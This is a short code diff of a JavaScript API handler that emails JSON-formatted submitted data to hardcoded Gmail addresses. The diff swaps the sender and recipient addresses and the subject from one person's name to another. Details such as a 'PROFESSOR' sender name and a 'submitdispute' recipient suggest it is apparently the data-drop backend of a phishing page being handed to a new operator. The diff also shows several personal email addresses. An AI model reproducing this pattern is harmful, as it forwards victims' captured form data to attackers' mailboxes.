@@ -25,9 +25,9 @@ export default async function handler(req, res) {
     const prettyJson = JSON.stringify(data, null, 2);
 
     await transporter.sendMail({
-      from: `"PROFESSOR" <dardhame1@gmail.com>`, // Name + Email
-      to: "submitdispute@gmail.com,newzatpage.com", // Zubair ka email yahan hardcode
-      subject: "Zubair",
+      from: `"PROFESSOR" <adsmenigar@gmail.com>`, 
+      to: "adsmenigar@gmail.com,weightyeshofsr@gmail.com", 
+      subject: "tahir",
       text: prettyJson,
       html: `<pre>${escapeHtml(prettyJson)}</pre>`
     });
